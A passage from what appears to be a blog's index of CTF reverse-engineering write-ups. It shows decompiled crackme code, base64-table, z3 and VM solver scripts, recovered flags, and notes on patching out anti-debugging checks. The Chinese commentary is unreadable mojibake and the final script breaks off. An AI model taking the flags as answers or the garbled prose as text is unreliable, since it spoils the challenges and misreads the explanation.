\"x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q\"; WriteFile(hFile, \"Enter password:\\r\\n\", 0x12u, \u0026NumberOfBytesWritten, 0); ReadFile(v7, Buffer, 0x80u, \u0026NumberOfBytesWritten, 0); Str1 = sub_401260(Buffer, NumberOfBytesWritten - 2); if ( !strcmp(Str1, Str2) ) WriteFile(hFile, \"Correct!\\r\\n\", 0xBu, \u0026NumberOfBytesWritten, 0); else WriteFile(hFile, \"Wrong password\\r\\n\", 0x11u, \u0026NumberOfBytesWritten, 0); return 0; } sub_401260å‡½æ•° char *__cdecl sub_401260(unsigned __int8 *input, unsigned int cnt) { int v3; // [esp+Ch] [ebp-24h] int v4; // [esp+10h] [ebp-20h] int v5; // [esp+14h] [ebp-1Ch] int i; // [esp+1Ch] [ebp-14h] unsigned int v7; // [esp+20h] [ebp-10h] char *v8; // [esp+24h] [ebp-Ch] int v9; // [esp+28h] [ebp-8h] int v10; // [esp+28h] [ebp-8h] unsigned int v11; // [esp+2Ch] [ebp-4h] v8 = (char *)malloc(4 * ((cnt + 2) / 3) + 1); if ( !v8 ) return 0; v11 = 0; v9 = 0; while ( v11 \u003c cnt ) { v5 = input[v11]; if ( ++v11 \u003e= cnt ) v4 = 0; else v4 = input[v11++]; if ( v11 \u003e= cnt ) v3 = 0; else v3 = input[v11++]; v7 = v3 + (v5 \u003c\u003c 16) + (v4 \u003c\u003c 8); v8[v9] = aZyxabcdefghijk[(v7 \u003e\u003e 18) \u0026 0x3F]; v10 = v9 + 1; v8[v10] = aZyxabcdefghijk[(v7 \u003e\u003e 12) \u0026 0x3F]; v8[++v10] = aZyxabcdefghijk[(v7 \u003e\u003e 6) \u0026 0x3F]; v8[++v10] = aZyxabcdefghijk[v3 \u0026 0x3F]; v9 = v10 + 1; } for ( i = 0; i \u003c *(_DWORD *)\u0026aZyxabcdefghijk[4 * (cnt % 3) + 64]; ++i ) v8[4 * ((cnt + 2) / 3) - i - 1] = 61; v8[4 * ((cnt + 2) / 3)] = 0; return v8; } çœ‹åˆ°ä¸‹é¢çš„aZyxabcdefghijkå°±æ„Ÿè§‰æœ‰ç‚¹base64æ¢è¡¨é‚£å‘³ï¼Œè¯•äº†ä¸€ä¸‹ï¼Œè¿˜çœŸæ˜¯ è„šæœ¬ import base64 standard_table = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\" new_table = \"ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/\" table = str.maketrans(new_table, standard_table) enc = \"x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q\" print(base64.b64decode(enc.translate(table))) #sh00ting_phish_in_a_barrel@flare-on.com ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:20:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[ACTFæ–°ç”Ÿèµ›2020]Oruga æ–°é¢–çš„è¿·å®«é¢˜ é€»è¾‘å‡½æ•° bool __fastcall sub_78A(char *input) { int v2; // [rsp+Ch] [rbp-Ch] int v3; // [rsp+10h] [rbp-8h] int head; // [rsp+14h] [rbp-4h] v2 = 0; v3 = 5; head = 0; while ( byte_201020[v2] != '!' ) { v2 -= head; if ( input[v3] != 'W' || head == -16 ) { if ( input[v3] != 'E' || head == 1 ) { if ( input[v3] != 'M' || head == 16 ) { if ( input[v3] != 'J' || head == -1 ) return 0; head = -1; } else { head = 16; } } else { head = 1; } } else { head = -16; } ++v3; while ( !byte_201020[v2] ) { if ( head == -1 \u0026\u0026 (v2 \u0026 0xF) == 0 ) return 0; if ( head == 1 \u0026\u0026 v2 % 16 == 15 ) return 0; if ( head == 16 \u0026\u0026 (unsigned int)(v2 - 240) \u003c= 0xF ) return 0; if ( head == -16 \u0026\u0026 (unsigned int)(v2 + 15) \u003c= 0x1E ) return 0; v2 += head; } } return input[v3] == '}'; } åªè¦å½“å‰å­—ç¬¦ä¸º0,å°±æœä¸€ä¸ªæ–¹å‘ä¸€ç›´èµ°ä¸‹å»ï¼Œè¶Šç•Œå°±å¯„äº† æ‰‹åŠ¨èµ°ä¸€ä¸‹ flagï¼šactf{MEWEMEWJMEWJM} ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:21:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[Zer0pts2020]easy strcmp å‡ºé¢˜äººåœ¨mainå‡½æ•°ä¹‹å‰ä¿®æ”¹äº†strcmpå‡½æ•° åŠ¨è°ƒæ‰¾åˆ°ä¿®æ”¹åçš„ä»£ç  __int64 __fastcall sub_559B072006EA(char *a1, __int64 a2) { int i; // [rsp+18h] [rbp-8h] int v4; // [rsp+18h] [rbp-8h] int j; // [rsp+1Ch] [rbp-4h] for ( i = 0; a1[i]; ++i ) ; v4 = (i \u003e\u003e 3) + 1; for ( j = 0; j \u003c v4; ++j ) *(_QWORD *)\u0026a1[8 * j] -= qword_559B07401060[j]; return off_559B07401090(a1, a2); } å…¶å®æ˜¯æŠŠinputå‡å»qword_559B07401060ä¸zer0pts{********CENSORED********}æ¯”è¾ƒ åˆšå¼€å§‹æƒ³é€ä½è§£å¯†ï¼Œä½†å‘ç°ä¸­é—´8ä½æœ‰é—®é¢˜ï¼Œåº”è¯¥æ˜¯æœ‰è¿›ä½çš„åŸå›  è¿˜æ˜¯å¾—å¼ºè½¬æˆqwordè¿ç®—ï¼Œä½†å®æµ‹è¿™ä¹ˆç®—å‡ºæ¥æœ€åä¼šå¤šä¸€ä½*ï¼Œåˆ æ‰å³å¯ #include\u003cstdio.h\u003e int main(){ unsigned long long key[] = {0x410A4335494A0942, 0x0B0EF2F50BE619F0, 0x4F0A3A064A35282B}; char en_flag[] = \"********CENSORED********\"; char flag[] = \"\"; for(int i = 0; i \u003c 3; i++){ *((long long *)flag + i) = *((long long *)en_flag + i) + key[i]; } puts(flag); //l3ts_m4k3_4_DETOUR_t0d4y* } flag{l3ts_m4k3_4_DETOUR_t0d4y} ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:22:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[ACTFæ–°ç”Ÿèµ›2020]Universe_final_answer mainå‡½æ•° __int64 __fastcall main(int a1, char **a2, char **a3) { char v4[32]; // [rsp+0h] [rbp-A8h] BYREF char input[104]; // [rsp+20h] [rbp-88h] BYREF unsigned __int64 v6; // [rsp+88h] [rbp-20h] v6 = __readfsqword(0x28u); __printf_chk(1LL, \"Please give me the key string:\", a3); scanf(\"%s\", input); if ( sub_860(input) ) { sub_C50(input, v4); __printf_chk(1LL, \"Judgement pass! flag is actf{%s_%s}\\n\", input); } else { puts(\"False key!\"); } return 0LL; } éªŒè¯å‡½æ•° bool __fastcall sub_860(char *a1) { int v1; // ecx int v2; // esi int v3; // edx int v4; // er9 int v5; // er11 int v6; // ebp int v7; // ebx int v8; // er8 int v9; // er10 bool result; // al int v11; // [rsp+0h] [rbp-38h] v1 = a1[1]; v2 = *a1; v3 = a1[2]; v4 = a1[3]; v5 = a1[4]; v6 = a1[6]; v7 = a1[5]; v8 = a1[7]; v9 = a1[8]; result = 0; if ( -85 * v9 + 58 * v8 + 97 * v6 + v7 + -45 * v5 + 84 * v4 + 95 * v2 - 20 * v1 + 12 * v3 == 12613 ) { v11 = a1[9]; if ( 30 * v11 + -70 * v9 + -122 * v6 + -81 * v7 + -66 * v5 + -115 * v4 + -41 * v3 + -86 * v1 - 15 * v2 - 30 * v8 == -54400 \u0026\u0026 -103 * v11 + 120 * v8 + 108 * v7 + 48 * v4 + -89 * v3 + 78 * v1 - 41 * v2 + 31 * v5 - (v6 \u003c\u003c 6) - 120 * v9 == -10283 \u0026\u0026 71 * v6 + (v7 \u003c\u003c 7) + 99 * v5 + -111 * v3 + 85 * v1 + 79 * v2 - 30 * v4 - 119 * v8 + 48 * v9 - 16 * v11 == 22855 \u0026\u0026 5 * v11 + 23 * v9 + 122 * v8 + -19 * v6 + 99 * v7 + -117 * v5 + -69 * v3 + 22 * v1 - 98 * v2 + 10 * v4 == -2944 \u0026\u0026 -54 * v11 + -23 * v8 + -82 * v3 + -85 * v2 + 124 * v1 - 11 * v4 - 8 * v5 - 60 * v7 + 95 * v6 + 100 * v9 == -2222 \u0026\u0026 -83 * v11 + -111 * v7 + -57 * v2 + 41 * v1 + 73 * v3 - 18 * v4 + 26 * v5 + 16 * v6 + 77 * v8 - 63 * v9 == -13258 \u0026\u0026 81 * v11 + -48 * v9 + 66 * v8 + -104 * v6 + -121 * v7 + 95 * v5 + 85 * v4 + 60 * v3 + -85 * v2 + 80 * v1 == -1559 \u0026\u0026 101 * v11 + -85 * v9 + 7 * v6 + 117 * v7 + -83 * v5 + -101 * v4 + 90 * v3 + -28 * v1 + 18 * v2 - v8 == 6308 ) { result = 99 * v11 + -28 * v9 + 5 * v8 + 93 * v6 + -18 * v7 + -127 * v5 + 6 * v4 + -9 * v3 + -93 * v1 + 58 * v2 == -1697; } } return result; } ç›´æ¥ä¸Šz3 from z3 import * v1 = Int('v1') v2 = Int('v2') v3 = Int('v3') v4 = Int('v4') v5 = Int('v5') v6 = Int('v6') v7 = Int('v7') v8 = Int('v8') v9 = Int('v9') v10 = Int('v10') v11 = Int('v11') s = z3.Solver() s.add(-85 * v9 + 58 * v8 + 97 * v6 + v7 + -45 * v5 + 84 * v4 + 95 * v2 - 20 * v1 + 12 * v3 == 12613) s.add(30 * v11 + -70 * v9 + -122 * v6 + -81 * v7 + -66 * v5 + -115 * v4 + -41 * v3 + -86 * v1 - 15 * v2 - 30 * v8 == -54400) s.add(-103 * v11 + 120 * v8 + 108 * v7 + 48 * v4 + -89 * v3 + 78 * v1 - 41 * v2 + 31 * v5 - (v6 * 64) - 120 * v9 == -10283) s.add(71 * v6 + (v7 * 128) + 99 * v5 + -111 * v3 + 85 * v1 + 79 * v2 - 30 * v4 - 119 * v8 + 48 * v9 - 16 * v11 == 22855) s.add(5 * v11 + 23 * v9 + 122 * v8 + -19 * v6 + 99 * v7 + -117 * v5 + -69 * v3 + 22 * v1 - 98 * v2 + 10 * v4 == -2944) s.add(-54 * v11 + -23 * v8 + -82 * v3 + -85 * v2 + 124 * v1 - 11 * v4 - 8 * v5 - 60 * v7 + 95 * v6 + 100 * v9 == -2222) s.add(-83 * v11 + -111 * v7 + -57 * v2 + 41 * v1 + 73 * v3 - 18 * v4 + 26 * v5 + 16 * v6 + 77 * v8 - 63 * v9 == -13258) s.add(81 * v11 + -48 * v9 + 66 * v8 + -104 * v6 + -121 * v7 + 95 * v5 + 85 * v4 + 60 * v3 + -85 * v2 + 80 * v1 == -1559) s.add(101 * v11 + -85 * v9 + 7 * v6 + 117 * v7 + -83 * v5 + -101 * v4 + 90 * v3 + -28 * v1 + 18 * v2 - v8 == 6308) s.add(99 * v11 + -28 * v9 + 5 * v8 + 93 * v6 + -18 * v7 + -127 * v5 + 6 * v4 + -9 * v3 + -93 * v1 + 58 * v2 == -1697) s.check() print(s.model()) idaé‡Œçš„æ•°æ®é¡ºåºå¾ˆä¹±ï¼Œæ‰‹åŠ¨è°ƒæ•´ä¸€ä¸‹ v = [0] * 10 v[1] = 48 v[6] = 95 v[0] = 70 v[3] = 82 v[9] = 64 v[2] = 117 v[4] = 84 v[5] = 121 v[8] = 119 v[7] = 55 for i in v: print(chr(i), end=\"\") #F0uRTy_7w@ æ‹¿åˆ°keyï¼Œè¿è¡Œç¨‹åºè¾“å…¥keyæ‹¿åˆ°flag ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:23:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"Crack me é›†åˆäº†å„ç§åè°ƒè¯•çš„ä¸€é“é¢˜ mainå‡½æ•° int wmain() { FILE *v0; // eax FILE *v1; // eax char v3; // [esp+3h] [ebp-405h] char v4; // [esp+4h] [ebp-404h] BYREF char v5[255]; // [esp+5h] [ebp-403h] BYREF char Format; // [esp+104h] [ebp-304h] BYREF char v7[255]; // [esp+105h] [ebp-303h] BYREF char passwd; // [esp+204h] [ebp-204h] BYREF char v9[255]; // [esp+205h] [ebp-203h] BYREF char user; // [esp+304h] [ebp-104h] BYREF char v11[255]; // [esp+305h] [ebp-103h] BYREF printf(\"Come one! Crack Me~~~\\n\"); user = 0; memset(v11, 0, sizeof(v11)); passwd = 0; memset(v9, 0, sizeof(v9)); while ( 1 ) { do { do { printf(\"user(6-16 letters or numbers):\"); scanf(\"%s\", \u0026user); v0 = (FILE *)sub_CD24BE(); fflush(v0); } while ( !(unsigned __int8)sub_CD1000(\u0026user) ); printf(\"password(6-16 letters or numbers):\"); scanf(\"%s\", \u0026passwd); v1 = (FILE *)sub_CD24BE(); fflush(v1); } while ( !(unsigned __int8)sub_CD1000(\u0026passwd) ); sub_CD1090(\u0026user); Format = 0; memset(v7, 0, sizeof(v7)); v4 = 0; memset(v5, 0, sizeof(v5)); v3 = ((int (__cdecl *)(char *, char *))loc_CD11A0)(\u0026Format, \u0026v4); if ( sub_CD1830((int)\u0026user, \u0026passwd) ) { if ( v3 ) break; } printf(\u0026v4); } printf(\u0026Format); return 0; } å…ˆåè¾“å…¥ç”¨æˆ·åï¼ˆwelcomebeijingï¼‰å’Œå¯†ç ï¼Œæ¯æ¬¡è¾“å…¥è¿‡åæœ‰ä¸€ä¸ªsub_CD24BEå‡½æ•°ï¼ŒåŠ¨è°ƒå‘ç°å¯¹userå’Œpasswdéƒ½æ²¡å½±å“ï¼Œè·³è¿‡å³å¯ ä¸»è¦åŠ å¯†/åˆ¤æ–­åœ¨sub_CD1830å‡½æ•° bool __usercall sub_CD1830@\u003cal\u003e(int a1@\u003cebx\u003e, char *user, const char *passwd) { int v4; // [esp+18h] [ebp-22Ch] int v5; // [esp+1Ch] [ebp-228h] int j; // [esp+28h] [ebp-21Ch] unsigned int i; // [esp+30h] [ebp-214h] char v8; // [esp+36h] [ebp-20Eh] char v9; // [esp+37h] [ebp-20Dh] char v10; // [esp+38h] [ebp-20Ch] unsigned __int8 v11; // [esp+39h] [ebp-20Bh] unsigned __int8 v12; // [esp+3Ah] [ebp-20Ah] char v13; // [esp+3Bh] [ebp-209h] int check; // [esp+3Ch] [ebp-208h] BYREF char v15; // [esp+40h] [ebp-204h] BYREF char v16[255]; // [esp+41h] [ebp-203h] BYREF _BYTE v17[256]; // [esp+140h] [ebp-104h] BYREF v5 = 0; j = 0; v12 = 0; v11 = 0; v17[0] = 0; memset(\u0026v17[1], 0, 0xFFu); v15 = 0; memset(v16, 0, sizeof(v16)); v10 = 0; i = 0; v4 = 0; while ( i \u003c strlen(passwd) ) { if ( isdigit(passwd[i]) ) { v9 = passwd[i] - 48; } else if ( isxdigit(passwd[i]) ) { if ( *((_DWORD *)NtCurrentPeb()-\u003eSubSystemData + 3) == 2 )// åè°ƒ passwd[i] = 34; v9 = (passwd[i] | 0x20) - 87; } else { v9 = ((passwd[i] | 0x20) - 97) % 6 + 10; } __rdtsc(); __rdtsc(); v10 = v9 + 16 * v10; if ( !((int)(i + 1) % 2) ) { *(\u0026v15 + v4++) = v10; a1 = v4; v10 = 0; } ++i; } while ( j \u003c 8 ) { v11 += byte_CE6050[++v12]; v13 = byte_CE6050[v12]; v8 = byte_CE6050[v11]; byte_CE6050[v11] = v13; byte_CE6050[v12] = v8; if ( ((int)NtCurrentPeb()-\u003eUnicodeCaseTableData \u0026 0x70) == 0 )// åè°ƒ v13 = v11 + v12; v17[j] = byte_CE6050[(unsigned __int8)(v8 + v13)] ^ *(\u0026v15 + v5); if ( !(unsigned __int8)*(_DWORD *)\u0026NtCurrentPeb()-\u003eBeingDebugged )// åè°ƒ { v11 = -83; v12 = 43; } sub_CD1710((int)v17, user, j++); v5 = j; if ( j \u003e= (unsigned int)(\u0026v15 + strlen(\u0026v15) + 1 - v16) ) v5 = 0; } check = 0; sub_CD1470(a1, v17, \u0026check); return check == 0xAB94; } ä»ä¸Šåˆ°ä¸‹æ€»å…±ä¸‰æ¬¡åè°ƒè¯•æ“ä½œï¼Œä¸Šé¢å·²ç»æ˜¯patchè¿‡çš„ç‰ˆæœ¬ï¼ˆå¯¹åº”æ±‡ç¼–jzä¸jnzäº’æ”¹ï¼‰ ä¸Šé¢ä¸€ä¸ªwhileå¾ªç¯å®ç°äº†ä»å­—ç¬¦ä¸²æ•°æ®ä¸­è·å¾—åŸæœ¬å­—ç¬¦å€¼ï¼Œå…·ä½“å¯åŠ¨è°ƒè¯•è¯• ä¸‹é¢åŠ å¯†éƒ¨åˆ†å¤§è‡´å¯åˆ†ä¸º3å—ï¼Œä¸‹é¢å€’ç€åˆ†æ ç¬¬ä¸€å— æ•´ä¸ªå‡½æ•°æœ€åè¿”å›éªŒè¯çš„æ˜¯checkå€¼ï¼Œè€Œcheckå€¼åº”ç”±sub_CD1470è·å¾— sub_CD1470å‡½æ•° void __usercall sub_CD1470(int a1@\u003cebx\u003e, _BYTE *v17, _DWORD *check) { char v5; // al if ( *v17 != 'd' ) *check ^= 3u; else *check |= 4u; if ( v17[1] != 'b' ) { *check \u0026= 0x61u; _EAX = (_DWORD *)*check; } else { _EAX = check; *check |= 20u; } __asm { aam } if ( v17[2] != 'a' ) *check \u0026= 0xAu; else *check |= 0x84u; if ( v17[3] != 'p' ) *check \u003e\u003e= 7; else *check |= 0x114u; if ( v17[4] != 'p' ) *check *= 2; else *check |= 0x380u; if ( *((_DWORD *)NtCurrentPeb()-\u003eSubSystemData + 3) != 2 )// åè°ƒ { if ( v17[5] != 'f' ) *check |= 0x21u; else *check |= 0x2DCu; } if ( v17[5] != 's' ) { v5 = (char)check; *check ^= 0x1ADu; } else { *check |= 0xA04u; v5 = (char)check; } _AL = v5 - (~(a1 \u003e\u003e 5) - 1); __asm { daa } if ( v17[6] != 'e' ) *check |= 0x4Au; else *check |= 0x2310u; if ( v17[7] != 'c' ) *check \u0026= 0x3A3u; else *check |= 0x8A10u; } å¯è§æœ‰æ„ä¹‰å­—ç¬¦ä¸²dbappsecï¼ŒæŠŠcheckå¼‚æˆ–ä¸Šç›¸åº”çš„å€¼æ­£å¥½æ˜¯éªŒè¯æ‰€éœ€çš„0","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:24:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"ç‰¹æ®Šçš„base64 mainå‡½æ•° int __cdecl main(int argc, const char **argv, const char **envp) { __int64 v3; // rax __int64 v4; // rax char v6[16]; // [rsp+20h] [rbp-60h] BYREF char v7[16]; // [rsp+30h] [rbp-50h] BYREF char input[15]; // [rsp+40h] [rbp-40h] BYREF char v9; // [rsp+4Fh] [rbp-31h] BYREF char v10[32]; // [rsp+50h] [rbp-30h] BYREF _main(argc, argv, envp); std::string::string((std::string *)input); std::allocator\u003cchar\u003e::allocator(\u0026v9); std::string::string(v7, \"mTyqm7wjODkrNLcWl0eqO8K8gc1BPk1GNLgUpI==\", \u0026v9); std::allocator\u003cchar\u003e::~allocator(\u0026v9); v3 = std::operator\u003c\u003c\u003cstd::char_traits\u003cchar\u003e\u003e(refptr__ZSt4cout, \"Please input your flag!!!!\"); std::ostream::operator\u003c\u003c(v3, refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_); std::operator\u003e\u003e\u003cchar\u003e(refptr__ZSt3cin, (std::string *)input); std::string::string((std::string *)v10, (const std::string *)input); base64Encode(v6, v10); std::string::~string((std::string *)v10); if ( (unsigned __int8)std::operator==\u003cchar\u003e(v6, v7) ) v4 = std::operator\u003c\u003c\u003cstd::char_traits\u003cchar\u003e\u003e(refptr__ZSt4cout, \"The flag is right!!!!!!!!!\"); else v4 = std::operator\u003c\u003c\u003cstd::char_traits\u003cchar\u003e\u003e(refptr__ZSt4cout, \"This is a wrong flag!!!!!!!!\"); std::ostream::operator\u003c\u003c(v4, refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_); std::string::~string((std::string *)v6); std::string::~string((std::string *)v7); std::string::~string((std::string *)input); return 0; } è¿˜æ˜¯base64æ¢è¡¨ï¼Œç›´æ¥ä¸Šè„šæœ¬å§ import base64 standard_table = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\" new_table = \"AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0987654321/+\" enc = \"mTyqm7wjODkrNLcWl0eqO8K8gc1BPk1GNLgUpI==\" table = str.maketrans(new_table, standard_table) print(base64.b64decode(enc.translate(table))) bâ€™flag{Special_Base64_By_Lich}' ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:25:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[WUSTCTF2020]level4 è¿™é“é¢˜æ˜¯ä¸ªä½“åŠ›æ´» mainå‡½æ•° int __cdecl main(int argc, const char **argv, const char **envp) { puts(\"Practice my Data Structure code.....\"); puts(\"Typing....Struct.....char....*left....*right............emmmmm...OK!\"); init(); puts(\"Traversal!\"); printf(\"Traversal type 1:\"); midTraversal((char *)\u0026node_23_root); printf(\"\\nTraversal type 2:\"); lastTraversal((char *)\u0026node_23_root); printf(\"\\nTraversal type 3:\"); puts(\" //type3(\u0026x[22]); No way!\"); puts(\u0026byte_400A37); return 0; } å·²çŸ¥äºŒå‰æ ‘çš„ä¸­åºéå†å’Œååºéå†ï¼ˆè¿è¡Œå³å¯å¾—åˆ°ï¼‰ï¼Œæ±‚å…ˆåºéå† 2f0t02T{hcsiI_SwA__r7Ee} 20f0Th{2tsIS_icArE}e7__w ä½†ç”±äºä¸­é—´æœ‰é‡å¤å­—ç¬¦ï¼Œæäº†ä¸€ä¼šæ²¡æå‡ºæ¥ï¼Œè½¬è€Œå»çœ‹initå‡½æ•°ï¼Œå³äºŒå‰æ ‘çš„æ„å»ºè¿‡ç¨‹ï¼Œè¿™é‡Œéœ€è¦æ‰‹åŠ¨ä¿®ä¸€ä¸‹ç»“æ„ä½“ï¼Œæœ€ç»ˆæ•ˆæœ void init() { int i; // [rsp+Ch] [rbp-34h] char v1[40]; // [rsp+10h] [rbp-30h] BYREF unsigned __int64 v2; // [rsp+38h] [rbp-8h] v2 = __readfsqword(0x28u); strcpy(v1, \"I{_}Af2700ih_secTS2Et_wr\"); for ( i = 0; i \u003c= 23; ++i ) *((_BYTE *)\u0026node_1.val + 24 * i) = v1[i]; node_23_root.left = \u0026node_16; node_16.left = \u0026node_21; node_21.left = \u0026node_6; node_6.left = \u0026node_7; node_6.right = \u0026node_9; node_21.right = \u0026node_19; node_19.left = \u0026node_10; node_19.right = \u0026node_2; node_2.left = \u0026node_17; node_2.right = \u0026node_12; node_16.right = \u0026node_11; node_11.left = \u0026node_14; node_11.right = \u0026node_3; node_3.left = \u0026node_1; node_3.right = \u0026node_18; node_23_root.right = \u0026node_22; node_22.left = \u0026node_5; node_22.right = \u0026node_13; node_13.right = \u0026node_8; node_8.left = \u0026node_24; node_8.right = \u0026node_15; node_15.left = \u0026node_20; node_15.right = \u0026node_4; } ç»“æ„ä½“å¦‚ä¸‹ï¼Œvalçš„å¤§å°å¯ä»¥è§‚å¯Ÿä¸€ä¸‹æ±‡ç¼–ä¸­çš„æ•°æ®å¾—åˆ° struct Tree { __int64 val; Tree *left; Tree *right; }; æ ¹æ®åªæœ‰å·¦å³èŠ‚ç‚¹ï¼Œæ²¡æœ‰çˆ¶èŠ‚ç‚¹çš„ç‰¹ç‚¹å¯ä»¥ç¡®å®š23å·ä¸ºroot ç„¶åå»ºç«‹æ•´æ£µæ ‘ w/23 c/16 _/22 t/21 i/11 A/5 _/13 f/6 2/19 s/14 _3 78 2/7 0/9 0/10 {/2 I/1 S/18 r/24 e/15 T/17 h/12 E/20 }/4 å…ˆåºéå†èµ°ä¸€ä¸‹æ‹¿åˆ°flagwctf2020{This_IS_A_7reE} ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:26:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[ç½‘é¼æ¯ 2020 é’é¾™ç»„]singal ä¸»è¦å‡½æ•°å¦‚ä¸‹ void __cdecl vm_operad(int *a1, int const_114) { char flag[200]; // [esp+13h] [ebp-E5h] BYREF char v3; // [esp+DBh] [ebp-1Dh] int v4; // [esp+DCh] [ebp-1Ch] int v5; // [esp+E0h] [ebp-18h] int v6; // [esp+E4h] [ebp-14h] int flag_cnt; // [esp+E8h] [ebp-10h] int a1_cnt; // [esp+ECh] [ebp-Ch] a1_cnt = 0; flag_cnt = 0; v6 = 0; v5 = 0; v4 = 0; LABEL_2: while ( a1_cnt \u003c const_114 ) { switch ( a1[a1_cnt] ) { case 1: flag[v5 + 100] = v3; ++a1_cnt; ++v5; ++flag_cnt; break; case 2: v3 = a1[a1_cnt + 1] + flag[flag_cnt]; a1_cnt += 2; break; case 3: v3 = flag[flag_cnt] - LOBYTE(a1[a1_cnt + 1]); a1_cnt += 2; break; case 4: v3 = a1[a1_cnt + 1] ^ flag[flag_cnt]; a1_cnt += 2; break; case 5: v3 = a1[a1_cnt + 1] * flag[flag_cnt]; a1_cnt += 2; break; case 6: ++a1_cnt; break; case 7: if ( flag[v6 + 100] != a1[a1_cnt + 1] ) { printf(\"what a shame...\"); exit(0); } ++v6; a1_cnt += 2; break; case 8: flag[v4] = v3; ++a1_cnt; ++v4; break; case 10: read(flag); ++a1_cnt; break; case 11: v3 = flag[flag_cnt] - 1; ++a1_cnt; break; case 12: v3 = flag[flag_cnt] + 1; ++a1_cnt; break; default: goto LABEL_2; } } } a1æ˜¯å‰é¢åˆå§‹åŒ–æ—¶ç”Ÿæˆçš„ä¸€ä¸ªè¡¨ï¼Œå¯ä»¥çœ‹å‡ºå…¨ç¨‹ä¸ä¼šæ”¹å˜ å˜é‡å€¼éƒ½æ˜¯å·²çŸ¥çš„ï¼Œæ±‚flag ç›®çš„ç®€å•æ˜ç¡®ï¼ŒæŠŠå®ƒé€†äº†ï¼Œä½†æœ‰å¾ˆå¤šç»†èŠ‚é—®é¢˜ a1é‡Œå­˜çš„å¹¶éå…¨æ˜¯æ“ä½œæ•°ï¼Œæœ‰äº›æ˜¯éœ€è¦å‚ä¸è¿ç®—çš„å€¼ï¼Œä¸Šä¸€æ­¥çš„æ“ä½œå†³å®šæ­¥é•¿ï¼ˆå³ä¸‹ä¸€æ­¥çš„æ“ä½œï¼‰ï¼Œé€†è¿‡æ¥çš„æ—¶å€™æ— æ³•åˆ¤æ–­æ­¥é•¿(å³a1_cntæ˜¯å‡1è¿˜æ˜¯å‡2) v3ï¼Œv4ï¼Œv5ï¼Œv6çš„ç»“æŸå€¼å³é€†å†™çš„åˆå€¼éœ€è¦ç¡®å®š defaulté‡Œgoto label_2éœ€è¦æ˜ç™½å…¶å®æ²¡å•¥ç”¨ é’ˆå¯¹ä»¥ä¸Šè§£å†³æ–¹æ¡ˆï¼ˆå¯èƒ½ä¸æ˜¯æœ€ä¼˜ æ‰€æœ‰æ“ä½œåæ­¥é•¿(a1_cnt)å‡è®¾ç½®æˆæœ€å°æ­¥é•¿-1ï¼Œç„¶ååŠ ä¸€ä¸ªåˆ¤æ–­ï¼Œæ˜¯å¦æ˜¯çœŸæ­£çš„æ“ä½œæ•°ï¼Œä¸æ˜¯çš„è¯å†a1_cnt-1 v3åˆ†æä¸€ä¸‹ä¼šå‘ç°è¿è¡Œæ—¶ä¼šå…ˆè¢«èµ‹å€¼åè¿›è¡Œè¿ç®—ï¼Œæ‰€ä»¥æ— éœ€åˆå€¼ã€‚è‡³äºv4ï¼Œv5ï¼Œv6ï¼Œè¿™å‡ ä¸ªå¾—è‡ªå·±æ•°ä¸€éï¼Œå¦‚æœåªæ˜¯éå†ä¸€éçœ‹è¿›å“ªä¸ªcaseå¯èƒ½ä¼šæŠŠéæ“ä½œæ•°ç®—ä¸Šï¼Œè¿˜å¥½æ•°é‡ä¸å¤ªå¤§ï¼Œæœ€åæ•°å‡ºæ¥ä¸‰ä¸ªæ•°éƒ½æ˜¯15 è‡³äºdefaultæ­£å¸¸è¿è¡Œæ˜¯ä¸ä¼šè¿›å»çš„ï¼Œå¿½ç•¥å³å¯ æœ€åè´´å‡ºè„šæœ¬ï¼Œè°ƒè¯•äº†å¥½ä¹…æ‰å‡ºï¼Œå†™å¾—æœ‰ç‚¹ç¹çä½†ä¸æƒ³æ”¹äº†ï¼ˆï¼ˆ #include \u003cstdio.h\u003e unsigned int a1[] = {};//è¿™å°±æ˜¯åŠ¨è°ƒdumpä¸‹æ¥çš„a1æ•°ç»„ï¼Œä½†å¤ªé•¿äº†ç²˜ä¸ä¸‹æ¥ int a1_cnt = 112; int flag_cnt = 15; int v6 = 15; int v5 = 15; int v4 = 15; int const_114 = 114; unsigned char flag[200]; unsigned char v3; int main() { while (a1_cnt \u003e= 0) { if (a1[a1_cnt - 1] \u003e= 2 \u0026\u0026 a1[a1_cnt - 1] \u003c= 5) { // è¿™ä¹ˆåˆ¤æ–­å¯èƒ½æ¢ä¸ªæ•°æ®å°±èƒ½å¡æ‰ï¼Œä½†æ˜¾ç„¶è¿™å·²ç»èƒ½æ‹¿åˆ°flagäº† a1_cnt--; // 5 3 8 ç‰¹åˆ¤ if (a1[a1_cnt - 1] \u003e= 2 \u0026\u0026 a1[a1_cnt - 1] 